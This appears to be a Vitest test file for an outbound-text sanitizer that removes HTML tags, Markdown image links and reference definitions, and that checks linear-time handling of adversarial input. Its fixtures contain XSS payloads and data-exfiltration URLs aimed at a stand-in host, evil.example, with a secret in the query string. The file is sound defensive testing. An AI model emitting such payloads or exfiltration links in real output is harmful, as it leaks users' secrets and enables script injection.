import { describe, expect, it } from 'vitest';
import { sanitizeOutboundText } from './sanitize';

const ZWSP = '\u200b';

/** No tag, comment or declaration can open in the output. */
function expectNoTagOpener(out: string) {
  expect(out).not.toMatch(/<[a-z/!?]/i);
}

function timed(input: string) {
  const start = performance.now();
  const out = sanitizeOutboundText(input);
  return { out, ms: performance.now() - start };
}

describe('sanitizeOutboundText HTML handling', () => {
  it('leaves no tag behind for nested and overlapping tags', () => {
    const cases = [
      '<scr<script>ipt>alert(1)</script>',
      '<<script>script>alert(1)<</script>/script>',
      '<img src=x onerror=alert(1)//',
      '<<img src=x>img src="https://evil.example/?d=SECRET">',
      '<!-- <img src="https://evil.example/?d=SECRET"> -->',
      '</ img>',
      '<a href="https://evil.example">x</a>',
      '<svg><svg/onload=alert(1)>',
    ];
    for (const input of cases) {
      const out = sanitizeOutboundText(input);
      expectNoTagOpener(out);
      expect(out).not.toContain('https://evil.example/?d=SECRET">');
      // Sanitizing again changes nothing: the output holds no tag.
      expect(sanitizeOutboundText(out)).toBe(out);
    }
    expect(sanitizeOutboundText('<scr<script>ipt>x')).toBe('ipt>x');
    expect(sanitizeOutboundText('<<script>script>')).toBe('');
    // Nesting deeper than the bounded passes is broken instead of stripped.
    const deep = '<'.repeat(6) + 'a>'.repeat(6);
    const out = sanitizeOutboundText(deep);
    expectNoTagOpener(out);
    expect(out).toContain(`<${ZWSP}`);
  });

  it('keeps ordinary comparisons and mentions intact', () => {
    expect(sanitizeOutboundText('1 < 2 and 3 > 2')).toBe('1 < 2 and 3 > 2');
    expect(sanitizeOutboundText('<@123>')).toBe(`<@${ZWSP}123>`);
  });
});

describe('sanitizeOutboundText reference definitions', () => {
  it('drops definitions, including blockquoted and next-line destinations', () => {
    expect(
      sanitizeOutboundText('a\n[r]: https://evil.example/?d=SECRET\nb')
    ).toBe('a\n\nb');
    expect(
      sanitizeOutboundText('> [r]: https://evil.example/?d=SECRET')
    ).not.toContain('SECRET');
    expect(
      sanitizeOutboundText('[x]:\n> https://evil.example/?d=SECRET\nkeep')
    ).toBe('\nkeep');
    expect(sanitizeOutboundText('[not a definition] here')).toBe(
      '[not a definition] here'
    );
    expect(sanitizeOutboundText('[]: empty label')).toBe('[]: empty label');
  });
});

describe('sanitizeOutboundText is idempotent', () => {
  it('removes definitions that a tag would hide', () => {
    const cases = [
      '<b>[x]: https://evil.example/?d=SECRET',
      '> <b>[x]: https://evil.example/?d=SECRET',
      '[x]<b>: https://evil.example/?d=SECRET',
      '<b>[x]:\nhttps://evil.example/?d=SECRET',
    ];
    for (const input of cases) {
      const out = sanitizeOutboundText(input);
      expect(out).not.toContain('SECRET');
      expect(sanitizeOutboundText(out)).toBe(out);
    }
  });

  it('changes nothing on a second run for the delivery cases', () => {
    const cases = [
      'See ![chart](https://evil.example/?q=secret) @everyone <@&123> <@!45>',
      '![x][r]\n[r]: https://evil.example/?s=SECRET',
      'hi <img src="https://evil.example/?a=SECRET"> there',
      '![a](https://evil.example/x_(1)?d=SECRET)',
      '![a](https://evil.example/?d=SECRET',
      '![a[b]](https://evil.example/?d=SECRET)',
      '![r]\n> [r]: https://evil.example/?d=SECRET',
      '![x][]\n[x]:\nhttps://evil.example/?d=SECRET',
      '<picture><source srcset="https://evil.example/?d=SECRET"></picture>',
    ];
    for (const input of cases) {
      const out = sanitizeOutboundText(input);
      expect(sanitizeOutboundText(out)).toBe(out);
    }
  });
});

describe('sanitizeOutboundText is linear on adversarial input', () => {
  const n = 100_000;
  const adversarial = {
    'unclosed tags': '<a'.repeat(n),
    'nested openers': '<'.repeat(n) + 'a',
    'tag soup': '<a <b <c '.repeat(n / 3),
    'blockquote run': `${'>'.repeat(n)}[`,
    'definition-like lines': '[x] :\n'.repeat(n / 6),
    'many definitions': '[x]:\n'.repeat(n / 5),
    'unclosed image alts': '!['.repeat(n),
    'unclosed image destinations': '![a]('.repeat(n / 5),
    'reference image runs': '![a]['.repeat(n / 5),
  };

  for (const [name, input] of Object.entries(adversarial)) {
    it(`handles ${name} quickly`, () => {
      const { out, ms } = timed(input);
      // A quadratic scan of this input takes tens of seconds.
      expect(ms).toBeLessThan(3_000);
      expectNoTagOpener(out);
    });
  }

  it('scales linearly rather than quadratically', { timeout: 30_000 }, () => {
    const small = timed('<a'.repeat(20_000) + '!['.repeat(20_000)).ms;
    const large = timed('<a'.repeat(160_000) + '!['.repeat(160_000)).ms;
    // Eight times the input; a quadratic scan would take about 64 times as long.
    expect(large).toBeLessThan(Math.max(small, 5) * 24);
  });
});
